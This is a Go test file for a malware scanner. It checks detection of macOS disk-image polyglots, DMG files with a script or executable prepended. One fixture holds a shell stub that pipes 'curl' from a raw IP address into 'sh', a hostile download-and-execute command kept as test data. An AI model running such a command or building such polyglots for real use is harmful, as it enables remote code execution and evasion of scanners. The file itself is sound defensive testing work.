package container

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/danczar/binchk/internal/analyze"
)

// TestUDIFPolyglotBothSides: a real image with any other leading content
// (a script, a package header) prepended still mounts, so both the leading
// bytes and the volume must be inspected.
func TestUDIFPolyglotBothSides(t *testing.T) {
	d := t.TempDir()
	src := filepath.Join(d, "src")
	os.MkdirAll(src, 0o755)
	makeApp(t, src, "Installer", evilBinary(t, d))
	img := filepath.Join(d, "evil.dmg")
	makeDMG(t, src, img)
	for _, tc := range []struct {
		name, format string
		stub         []byte
		want         []string
	}{
		{"script", "script", []byte("#!/bin/sh\ncurl -fsSL http://45.77.10.20/x | sh\nexit 0\n"), []string{"lolbin-download"}},
		{"xar", "Installer package", []byte("xar!\x00\x1c\x00\x01"), nil},
	} {
		t.Run(tc.name, func(t *testing.T) {
			poly := filepath.Join(d, "poly-"+tc.name+".dmg")
			prependToImage(t, img, poly, tc.stub)
			if out, err := exec.Command("hdiutil", "imageinfo", poly).CombinedOutput(); err != nil {
				t.Fatalf("polyglot does not open as an image: %v\n%s", err, out)
			}
			r := Analyze(context.Background(), engine(t), poly, analyze.Meta{})
			t.Logf("%s %s score=%d: %s", r.Format, r.Verdict, r.Score, r.Summary)
			if r.Format != tc.format || r.Container == nil {
				t.Fatalf("format %q container %v", r.Format, r.Container)
			}
			if r.Verdict != analyze.VerdictMalicious {
				t.Errorf("verdict %s", r.Verdict)
			}
			got := ids(r)
			for _, want := range append([]string{"udif-trailer", "ransom-note", "stealer-wallets"}, tc.want...) {
				if _, ok := got[want]; !ok {
					t.Errorf("missing %s: %v", want, got)
				}
			}
			walked := false
			for _, b := range r.Container.Bundles {
				walked = walked || b.Path == "Installer.app"
			}
			if !walked {
				t.Errorf("volume not walked: bundles %+v", r.Container.Bundles)
			}
			waitDetached(t, poly)
		})
	}
}

// TestLargeUDIFPolyglot: the executable side of a polyglot is the file
// itself and is analysed however large it is.
func TestLargeUDIFPolyglot(t *testing.T) {
	if testing.Short() {
		t.Skip("writes a sparse multi-GiB file")
	}
	d := t.TempDir()
	exe, err := os.ReadFile(evilBinary(t, d))
	if err != nil {
		t.Fatal(err)
	}
	p := filepath.Join(d, "big-koly")
	f, err := os.Create(p)
	if err != nil {
		t.Fatal(err)
	}
	f.Write(exe)
	trailer := make([]byte, 512)
	copy(trailer, "koly\x00\x00\x00\x04\x00\x00\x02\x00")
	size := int64(maxBytes) + 64<<20
	if _, err := f.WriteAt(trailer, size-512); err != nil {
		t.Fatal(err)
	}
	f.Close()
	r := Analyze(context.Background(), engine(t), p, analyze.Meta{})
	t.Logf("%s %s score=%d: %s", r.Format, r.Verdict, r.Score, r.Summary)
	got := ids(r)
	if r.Format != "Mach-O" {
		t.Errorf("format %q", r.Format)
	}
	// The executable's own analysis ran: its Mach-O checks and the trailer.
	for _, want := range []string{"udif-trailer", "macho-adhoc"} {
		if _, ok := got[want]; !ok {
			t.Errorf("missing %s: %v", want, got)
		}
	}
	// Scanning 3 GiB can outrun the budget (e.g. under -race); when it
	// does not, the content findings must be there too.
	if !r.Truncated {
		if _, ok := got["ransom-note"]; !ok || r.Verdict != analyze.VerdictMalicious {
			t.Errorf("large polyglot: %s score=%d %v", r.Verdict, r.Score, got)
		}
	}
	if r.Container == nil || r.Container.Skipped > 0 || len(r.Container.Files) == 0 {
		t.Errorf("file itself not analysed: %+v", r.Container)
	}
}

// TestUDIFPolyglotImagesOff: with image inspection disabled a polyglot is
// analysed as its leading format only, and never mounted.
func TestUDIFPolyglotImagesOff(t *testing.T) {
	d := t.TempDir()
	src := filepath.Join(d, "src")
	os.MkdirAll(src, 0o755)
	makeApp(t, src, "Installer", evilBinary(t, d))
	img := filepath.Join(d, "evil.dmg")
	makeDMG(t, src, img)
	poly := filepath.Join(d, "poly.dmg")
	exe, err := os.ReadFile(evilBinary(t, d))
	if err != nil {
		t.Fatal(err)
	}
	prependToImage(t, img, poly, exe[:4096])
	r := AnalyzeWith(context.Background(), engine(t), poly, analyze.Meta{}, Options{MountImages: false})
	t.Logf("%s %s score=%d: %s", r.Format, r.Verdict, r.Score, r.Summary)
	if r.Format != "Mach-O" {
		t.Errorf("format %q", r.Format)
	}
	if _, ok := ids(r)["udif-trailer"]; !ok {
		t.Errorf("udif-trailer missing: %v", ids(r))
	}
	if r.Container != nil && r.Container.Volume != "" {
		t.Errorf("image mounted although disabled: %+v", r.Container)
	}
	for _, tm := range r.Timings {
		if strings.Contains(tm.Name, "hdiutil") || strings.Contains(tm.Name, "Gatekeeper (disk image)") {
			t.Errorf("image tool ran although disabled: %s", tm.Name)
		}
	}
}
